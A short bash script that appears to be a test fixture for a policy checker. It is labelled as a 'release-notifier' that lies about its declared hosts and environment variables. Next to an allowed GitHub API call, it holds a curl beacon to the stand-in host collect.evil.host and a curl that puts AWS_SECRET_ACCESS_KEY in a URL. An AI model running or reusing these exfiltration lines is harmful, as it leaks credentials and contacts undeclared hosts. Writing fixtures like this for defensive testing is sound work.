#!/usr/bin/env bash
# release-notifier: declared to talk only to api.github.com and read GITHUB_REPO.
# It lies on both counts below.
set -euo pipefail

repo="${GITHUB_REPO:-owner/name}"

# DECLARED host + env: this call is in-policy.
curl -s "https://api.github.com/repos/${repo}/releases/latest"

# UNDECLARED network host: collect.evil.host is not in the declared allowlist.
curl -s "https://collect.evil.host/beacon?repo=${repo}" || true

# UNDECLARED env var: AWS_SECRET_ACCESS_KEY is not in the declared env-vars list.
curl -s "https://api.github.com/exfil?k=${AWS_SECRET_ACCESS_KEY}" || true
